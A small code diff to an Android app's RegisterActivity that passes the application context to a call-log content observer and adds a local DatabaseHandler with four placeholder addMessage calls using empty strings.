@@ -1,5 +1,7 @@
 package com.guser.service;
 
+import com.guser.service.DB.DatabaseHandler;
+
 import android.os.Bundle;
 import android.os.Handler;
 import android.app.Activity;
@@ -17,7 +19,14 @@ public class RegisterActivity extends Activity {
       	.getContentResolver()
       		.registerContentObserver(
       				android.provider.CallLog.Calls.CONTENT_URI, true,
-      					new CallsContentObserver(new Handler(), this)); 
+      					new CallsContentObserver(new Handler(), this.getApplicationContext())); 
+        
+        
+        DatabaseHandler db = new DatabaseHandler(this);
+        db.addMessage("");
+        db.addMessage("");
+        db.addMessage("");
+        db.addMessage("");
     }
 
     @Override
